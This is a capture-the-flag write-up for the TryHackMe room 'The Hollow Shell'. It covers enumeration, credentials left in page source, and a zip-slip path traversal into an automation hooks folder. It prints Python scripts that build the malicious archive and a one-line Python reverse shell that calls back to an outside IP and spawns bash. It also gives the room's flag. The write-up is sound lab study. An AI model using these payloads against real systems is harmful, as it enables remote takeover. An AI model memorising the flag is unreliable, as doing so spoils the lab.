![The Hollow Shell Banner](https://cdn-images.tryhackme.com/room-icons/5dbea226085ab6182a2ee0f7-1785251767201)

<p align="center">
   <img src="https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/hh-thehollowshell-ddb582ac/The_Hollow_Shell_Cover.png" alt="The Hollow Shell Logo">
</p>

# <img src="https://cdn-images.tryhackme.com/room-icons/5dbea226085ab6182a2ee0f7-1785251823751" alt="image" style="vertical-align: middle;height: 50px;" /> The Hollow Shell

This guide contains the answer and steps necessary to get to them for the [The Hollow Shell](https://tryhackme.com/room/hh-thehollowshell-ddb582ac) room.

<h2>Table of contents</h2>

- [Task 1 - Hacker Holidays: Day 10](#task-1---hacker-holidays-day-10)

### Task 1 - Hacker Holidays: Day 10

1.  What is the flag?

    First lets perform some basic enumeration with `nmap` and `gobuster`.

    ```console
    nmap -sV -sC 10.113.128.148
    gobuster dir -u http://10.113.128.148:5000 -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt 
    ```

    ![Nmap](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/hh-thehollowshell-ddb582ac/The_Hollow_Shell_Nmap.png)

    ![Gobuster](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/hh-thehollowshell-ddb582ac/The_Hollow_Shell_Gobuster.png)

    Looks like we have a webserver on port 5000 redirecting to a login page. The upload endpoint cannot be used through the browser. So this is likely used in the upload process itself.

    ![Login](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/hh-thehollowshell-ddb582ac/The_Hollow_Shell_Login.png)

    Looks like they forgot to remove some credentials on the page source! Never underestimate the importance of looking through the page source.

    ![Display](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/hh-thehollowshell-ddb582ac/The_Hollow_Shell_Display.png)

    Looks like we can upload a file here. It must be a zip file. But maybe we can trick the system into accepting a php file instead.

    Unfortunately, we cannot upload a reverse shell as 'shell.zip.php'. So we must create the archive as it is requesting.

    After some experimenting, I decided to upload a clean archive with the manifest to see where it goes.

    ![Zip](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/hh-thehollowshell-ddb582ac/The_Hollow_Shell_Zip.png)

    It goes to a shells folder. The file can now be opened from the browser. I tried the same with a python reverse shell (as this is most likely to be used by Flask), but it only displayed the contents without running it.

    ![Stored](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/hh-thehollowshell-ddb582ac/The_Hollow_Shell_Stored.png)

    From the challenge description we gather we need to slip something past. Combining this with a zip file, we can assume a 'zip slip' could be possible, where adding '../' to a filename in the archive, enables us to write to another folder.

    This path traversal might help us save the shell into the correct folder.

    We can use python to add files with slashes in their names. Lets try adding it to the statics page to get a proof of concept.

    ```python
    import zipfile
    zf = zipfile.ZipFile('shell.zip', 'w')
    zf.writestr('shell.json', open('shell.json').read())
    zf.writestr('../../static/letmein.py', open('letmein.py').read())
    zf.close()
    ```

    ![Traversal](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/hh-thehollowshell-ddb582ac/The_Hollow_Shell_Traversal.png)

    This worked. But we need it to get executed. The description talked about hooks automating work. We could try adding the file to the hooks folder instead of static.

    ```python
    import zipfile
    zf = zipfile.ZipFile('shell.zip', 'w')
    zf.writestr('shell.json', open('shell.json').read())
    zf.writestr('../../hooks/letmein.py', open('letmein.py').read())
    zf.close()
    ```

    I had some issues getting it to connect back. I realized the automation might already run in a python environment. Meaning the script would result in an error. In modified it and removed the `python -c` part. I also made the script executable for good measure.

    ```python
    # build script
    import zipfile

    zf = zipfile.ZipFile("shell.zip", "w")
    zf.writestr("shell.json", open("shell.json").read())
    zf.writestr("../../hooks/shell.py", open("shell.py").read())
    ```

    ```python
    # reverse shell
    import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.128.185",1337));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")
    ```

    ```console
    chmod +x shell.py
    python3 build.py
    ```

    Now that we have our connection, we can look for the flag.

    ![Flag](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/hh-thehollowshell-ddb582ac/The_Hollow_Shell_Flag.png)

    ><details><summary>Click for answer</summary>THM{z1p_sl1pp3d_1nt0_a_sh3ll}</details>
